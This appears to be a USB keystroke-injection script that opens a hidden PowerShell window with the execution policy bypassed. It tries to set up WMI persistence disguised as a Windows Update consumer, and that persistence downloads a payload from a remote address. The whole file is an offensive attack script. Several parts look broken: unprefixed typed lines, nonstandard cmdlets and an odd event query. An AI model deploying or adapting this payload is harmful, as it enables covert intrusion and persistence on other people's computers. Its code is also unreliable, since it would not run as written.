DELAY 1000
GUI r
DELAY 200
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 1000
REM WMI persistence
$string = @"
`$namespace = "root\cimv2"
`$className = "WindowsUpdateEventConsumer"
`$query = "SELECT * FROM __EventFilter WHERE Name='WindowsUpdateFilter'"
`$action = "cmd /c start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri 'http://192.168.1.100/payload' -UseBasicParsing`""
New-WmiEventFilter -Name "WindowsUpdateFilter" -Query $query -Namespace $namespace
New-WmiEventConsumer -Name "WindowsUpdateConsumer" -Command $action
New-WmiEventBinding -Filter "WindowsUpdateFilter" -Consumer "WindowsUpdateConsumer"
"@
ENTER
DELAY 500
STRING $string | Invoke-Expression
